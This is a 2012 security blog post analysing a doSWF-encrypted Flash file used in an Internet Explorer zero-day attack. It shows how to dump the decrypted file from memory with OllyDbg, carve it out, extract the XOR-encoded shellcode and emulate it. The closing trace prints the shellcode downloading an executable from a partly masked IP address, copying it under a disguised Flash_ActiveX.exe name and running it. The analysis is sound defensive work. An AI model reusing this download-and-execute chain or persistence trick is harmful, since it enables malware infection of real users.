---
layout: post
title: SWF-ing away
date: '2012-09-19T13:25:00.002-04:00'
author: hiddenillusion
image_folder: '2012-09-19'
tags: [0-day, Adobe Flash, SWF, doSWF, XOR, xxxswf, OllyDbg]
modified_time: '2012-09-20T21:11:47.835-04:00'
thumbnail: http://4.bp.blogspot.com/-aNiBPkPVoSg/UFn7SS3MZfI/AAAAAAAAAOk/RXSPGpTHaZ4/s72-c/exploit_html_commented.png
blogger_id: tag:blogger.com,1999:blog-7113964657426756490.post-4740341853882612293
blogger_orig_url: http://hiddenillusion.blogspot.com/2012/09/swf-ing-away.html
---

> **Disclaimer** - the intent of this post is for educational and research purposes only.  Don't be lame and use it to steal copyrighted material.

There's been quite a bit of chatter lately with the [recent discovery](http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/) of the latest [IE 0-day](https://technet.microsoft.com/en-us/security/advisory/2757760).  While reading through one of the other researchers [posts](http://labs.alienvault.com/labs/index.php/2012/the-connection-between-the-plugx-chinese-gang-and-the-latest-internet-explorer-zeroday/) I decided to take a deeper look into some of the files being used in these reported attacks.  The issue that some might be experiencing while trying to analyze the related flash files, as did I, is that they're **encrypted with [doSWF](http://www.doswf.com/)** and therefore take a little more effort in order to get down to what we care about.  A quick search about how to go about decrypting this particular type of encryption led me two good articles ([one](http://scrammed.blogspot.com/2012/05/look-at-object-confusion-vulnerability.html), [two](https://blog.avast.com/2011/09/09/breaking-through-flash-obfuscation/)).  

With the addition of another user posting a decompiled version of the [ActionScript](http://pastebin.com/wEYtDvm8) within the [file](https://www.virustotal.com/file/75bd9b405fd0239644ab0c6aae6579096a407ddedd3c6139219f8c8e8f5b2db3/analysis/) I was looking at I decided to give a quick look into this referenced [script](https://gist.github.com/1509527) and modify its `decrypt` function to correspond with the information provided.  I thought it would be an easy task but later turned out to result in errors.

> Java is something I don't care to debug...

The thought of having a script to aid in the future automation of decrypting such files would be helpful and might be re-visited but there's also a learning aspect to doing it manually.

# What to Use?

With that being said I opted to go about it in a different approach (attaching OllyDbg to IE and dumping the SWF from memory) which would be repeatable in future analysis efforts even if the type of encryption used was different - which makes it more reliable/flexible in my eyes.  There will be some overlap here to previously linked posts but instead of just saying what was done I feel it's useful for others to see how to do it.

So after wiping off the dust from OllyDbg I was able to get the end results I was seeking from my analysis by performing the steps outlined below.  Note that while some of the steps and content below are specific to the file I set out to analyze, other steps can be applied to help analyze other situations you might encounter.

# The Process

1. This initial step can be bypassed depending on what your analyzing and goals are but for this particular situation I started off by commenting out the part of the initial landing page which was responsible for initializing the variables and just left the part in which loaded the SWF file:

	![Exploit HTML Commented]({{ site.url }}/assets/images/blog/{{ page.image_folder }}/exploit_html_commented.png)

2. Open up IE (this could be another browser, depending on what your analyzing)
3. Open `OllyDbg` and attach the IE process (`File > Attach`).

	> If you have more than one instance of IE open, make sure you are attaching to the right one!

4. `Open exploit.htm` in IE which will load the SWF file
5. Locate the SWF loaded within IE's memory.  Go back to `OllyDbg:
View > Memory Map > right click > Search` (_Ctrl + B_)
The search criteria will be dependent on what you're looking to locate, and be mindful of little endian.  In this case I decided to search for **doSWF** which would be displayed here as **64 6F 53 57 46** in HEX.

	![doSWF]({{ site.url }}/assets/images/blog/{{ page.image_folder }}/doswf.png)

	There may be multiple hits of the text you are searching for - each of which will pop up in its own _Dump_ window.  Take a look at the context of where the found text is located and continue (`CTRL + L`) until you get one that looks like it's right.

6. Once you come across what looks to be your decrypted SWF file, within its Dump window; `right click > Copy > Select All`.  Now you might disagree with this approach and say why copy everything out instead of just what you're after but I'd rather copy it all out and worry about carving the exact SWF file later rather than manually calculating the correct SWF length and carving it out from `OllyDbg` (more on that latter).

	Once it's all highlighted; `right click > Binary > Binary Copy`

	![Dump SWF]({{ site.url }}/assets/images/blog/{{ page.image_folder }}/dump_swf.png)

	Open a hex editor (_[HxD](http://mh-nexus.de/en/hxd/) in this example_) and paste the copied information we took from `OllyDbg` into a new HEX file; `Edit > Paste write` _(CTRL + B)_

	You can scroll down to see the _goodies_ which also help in showing it's not encrypted anymore since these are strings we were unable to previously see:

	- File header (**46 57 53** : FWS)
	- iFrame reference and `call` statement to blob

	![Manual Carving]({{ site.url }}/assets/images/blog/{{ page.image_folder }}/where_to_carve_if_doing_manually.png)

	<small>(_image was widened to show it all, not all hex columns are shown as a result_)</small>

7. Since I copied everything over you can obviously see there's other junk there which we don't care about and will prohibit us from solely having the sought after SWF file.  As mentioned earlier, this can be solved by either manually carving it out based on Adobe's SWF [specifications](http://www.adobe.com/content/dam/Adobe/en/devnet/swf/pdf/swf_file_format_spec_v10.pdf)<i class="fa fa-file-pdf-o fa-fw"></i>:

	Bytes | Meaning
	--- | ---
	first 3 bytes | <font color='red'>header</font>
	next 1 byte | <font color='orange'>version</font> (8 bit #, not ascii representation)
	next 4 bytes | total <font color='blue'>length</font> including header (varies if compressed)

	HEX | Meaning
	--- | ---
	<font color='red'>46 57 53</font> | FWS
	<font color='orange'>09</font> | version 9
	<font color='blue'>BD 18 00 00</font> | 18BD (little endianed HEX or 6333 (decimal)	

	<small>(_you can see these corresponding values to the carved SWF in an image below_)</small>

	...or have a tool help you out.  While it's useful to know the specifications of what you're analyzing, having a tool to help you limit the chance of you creating an error is always nice so I opted use Alexs' kick-ass tool [xxxswf](http://hooked-on-mnemonics.blogspot.com/2011/12/xxxswfpy.html) to do the thinking and lifting for me.
    
    ![xxxswf]({{ site.url }}/assets/images/blog/{{ page.image_folder }}/xxxswf.png)

    No matter how you go about it, once you've successfully carved it out you should now have just the unencrypted SWF you can continue your analysis:

    ![xxxswf Carved Header]({{ site.url }}/assets/images/blog/{{ page.image_folder }}/xxxswf_carved_header.png)

8. Open up the unencrypted SWF with your tool of choice for analysis.  If you're using Adobe's SWF Investigator then copy out the disassembled text by: `SWF Dissasembler tab > open with text editor`

	Once you have the dissasembled code, scroll down until you see the blob being passed into the ByteArray and copy out what's inbetween the quotes:

   ![Array Blob]({{ site.url }}/assets/images/blog/{{ page.image_folder }}/array_blob.png)

# Working with the Shellcode
1. Take out that copied data and paste into a hex editor.  Since we see some `eval` occurring and this blob being a variable in the ByteArray I'm going to say this looks be the shellcode so let's go ahead and pass this extracted code within a shellcode analyzer for ease (_[scDbg/libemu](http://sandsprite.com/blogs/index.php?uid=7&pid=152) in this example_).  When initially analyzed it detects that the data is XOR'ed with the key `0xE2` :    

   ![Embedded EXE]({{ site.url }}/assets/images/blog/{{ page.image_folder }}/embedded_exe_xored.png)

   In the output of the first run through `libemu` we noticed there was an error so by adding the `-d` switch and running through it we get the following:

   ![Decoded File]({{ site.url }}/assets/images/blog/{{ page.image_folder }}/file_decoded.png)

2. Well that's helpful - now we don't have to question if it is and/or search for the key since it's already provided to us.  This allows us to move on to reversing the XOR with a capable program:

   ![UnXored]({{ site.url }}/assets/images/blog/{{ page.image_folder }}/un_xored.png)

   A quick test of determining what the actual file is (shown in the second command above) after being reversed shows it's just **data**.  Hm, it doesn't appear to be what I'd expect as a result of the shellcode or did something fail when performing the XOR?  If we view the strings of this data we see it displays a link to a file which could indicate a 2nd stage download:

   ![Second Stage Download]({{ site.url }}/assets/images/blog/{{ page.image_folder }}/2nd_stage_download.png)

3. To figure out why this didn't fully work, a reader (carb0n) left some useful notes:

	It looks like it expects data at a hardcoded address. _dereference_ is meant to hamper analysis.

	<pre>
	seg000:00000021 BB A0 10 10 0C mov ebx, 0C1010A0h
	seg000:00000026 8B 0B mov ecx, [ebx]
	</pre>

	If you nop this in unpacked dump and nop xor decoder you can then run unpacked dump for full analysis in scdbg.

	<pre>
	401063 LoadLibraryA(urlmon)
	401082 LoadLibraryA(shell32)
	4010b7 MultiByteToWideChar(http://62.xxx.xxx.149/public/help/111.exe)
	4010dd URLDownloadToCacheFileW(http://62.xxx.xxx.149/public/help/111.exe, buf=4014e0)
	Opening a valid handle to c:\URLCacheTmpPath.exe
	4010fe CreateFileW(c:\URLCacheTmpPath.exe) = 7ac
	401110 GetFileSize(7ac, 0) = 0
	401148 CreateFileW(c:\URLCbcheTmpPath.exe) = 7a8
	Interactive mode local file C:\DOCUME~1\xxx\Desktop\MOD_31~1.drop_0
	40116d SetFilePointer(hFile=7ac, dist=0, 0, FILE_BEGIN) = 0
	ReadFile error? numBytes=400 bytesRead=0 rv=1
	401198 ReadFile(hFile=7ac, buf=1305f0, numBytes=400) = 1
	4011d6 WriteFile(h=7a8, buf=1305f0, len=0, lpw=401434, lap=0) = 1
	4011e7 CloseHandle(7ac)
	4011f0 CloseHandle(7a8)
	401216 WideCharToMultiByte(0,0,in=4014e0,sz=ffffffff,out=4015f0,sz=100,0,0) = 0
	40122c SHGetSpecialFolderPathA(buf=4016f0, C:\Documents and Settings\xxx\Application Data)
	4012c7 CopyFileA(, C:\Documents and Settings\xxx\Application Data\Macromedia\Flash Player\#SharedO
	bjects\Flash_ActiveX.exe)
	4012dd WinExec(C:\Documents and Settings\xxx\Application Data\Macromedia\Flash Player\#SharedObjec
	ts\Flash_ActiveX.exe)
	</pre>

	Aditionally, there's a new option in `scdbg` just for this type of thing `/va 0c1010a0-4`